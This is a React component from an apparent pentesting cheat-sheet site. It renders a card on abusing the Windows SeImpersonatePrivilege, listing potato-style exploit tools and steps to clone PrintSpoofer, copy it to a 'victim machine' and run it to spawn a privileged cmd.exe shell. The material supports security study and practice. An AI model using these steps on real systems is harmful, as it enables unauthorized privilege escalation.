import {
  Typography,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Box,
} from "@mui/material";
import Link from "next/link";
import SyntaxHighlighter from "react-syntax-highlighter";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import Image from "next/image";

interface IProps {
  title: string;
}

const SeImpersonatePrivilege = ({ title }: IProps) => {
  return (
    <>
      {" "}
      <Accordion sx={{ backgroundColor: "primary.main" }}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon />}
          aria-controls="panel1a-content"
          id="panel1a-header"
        >
          <Typography>{title}</Typography>
        </AccordionSummary>
        <AccordionDetails
          sx={{ backgroundColor: "primary.background_accordian" }}
        >
          <Typography
            sx={{
              color: "primary.main",
            }}
          >
            <Typography variant="h6">Description</Typography>
            <Typography>
              Any process holding this privilege can impersonate (but not
              create) any token for which it is able to get handle. You can
              exploit this privilege with juicy-potato, RougueWinRM (needs winrm
              disabled), SweetPotato, PrintSpoofer.
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 1</Typography>
            <Typography>
              Chech privileges for{" "}
              <Typography className="highlight" display="inline">
                SeImpersonatePrivilege
              </Typography>
            </Typography>
            <Image
              src="/seimpersonateprivilege.png"
              height={266}
              width={672}
              priority={true}
            />
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 2</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"git clone https://github.com/dievus/printspoofer"}
            </SyntaxHighlighter>

            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 3</Typography>
            <Typography>
              Transfer PrintSpoofer.exe to victim machine.
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 4</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {".\\PrintSpoofer.exe -i -c cmd.exe"}
            </SyntaxHighlighter>
          </Typography>
        </AccordionDetails>
      </Accordion>
    </>
  );
};

export default SeImpersonatePrivilege;
